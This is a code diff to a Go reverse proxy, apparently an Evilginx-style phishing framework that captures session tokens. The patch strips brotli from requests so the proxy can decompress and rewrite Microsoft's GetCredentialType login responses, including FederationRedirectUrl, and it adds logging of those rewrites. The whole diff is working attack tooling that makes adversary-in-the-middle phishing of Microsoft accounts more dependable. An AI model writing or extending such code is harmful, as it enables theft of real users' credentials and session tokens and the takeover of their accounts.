@@ -685,6 +685,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
 
+				// Strip brotli (br) from Accept-Encoding so upstream servers use
+				// gzip/deflate, which we can decompress for sub_filter text replacement.
+				// Go's stdlib has no brotli support; without this Microsoft's JSON API
+				// responses (e.g. GetCredentialType.srf) arrive br-compressed and
+				// sub_filters silently fail to rewrite FederationRedirectUrl.
+				if ae := req.Header.Get("Accept-Encoding"); ae != "" {
+					parts := strings.Split(ae, ",")
+					kept := parts[:0]
+					for _, part := range parts {
+						if !strings.Contains(strings.ToLower(strings.TrimSpace(part)), "br") {
+							kept = append(kept, part)
+						}
+					}
+					if len(kept) > 0 {
+						req.Header.Set("Accept-Encoding", strings.Join(kept, ","))
+					} else {
+						req.Header.Del("Accept-Encoding")
+					}
+				}
+
 				// fix sec-fetch-dest
 				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
 				if sec_fetch_dest != "" {
@@ -1128,6 +1148,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Debug: trace FederationRedirectUrl in GetCredentialType responses
+			if strings.Contains(resp.Request.URL.Path, "GetCredentialType") {
+				if strings.Contains(string(body), "FederationRedirectUrl") {
+					log.Info("[fed] GetCredentialType has FederationRedirectUrl (enc=%s) — will rewrite", contentEncoding)
+				} else {
+					log.Debug("[fed] GetCredentialType has no FederationRedirectUrl (enc=%s bodylen=%d)", contentEncoding, len(body))
+				}
+			}
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1262,7 +1291,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
+										newBody := re.ReplaceAllString(string(body), replace_s)
+										if newBody != string(body) {
+											log.Debug("[sub_filter] rewrote %q → %q in %s", re_s, replace_s, resp.Request.URL.Path)
+										}
+										body = []byte(newBody)
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
 									}
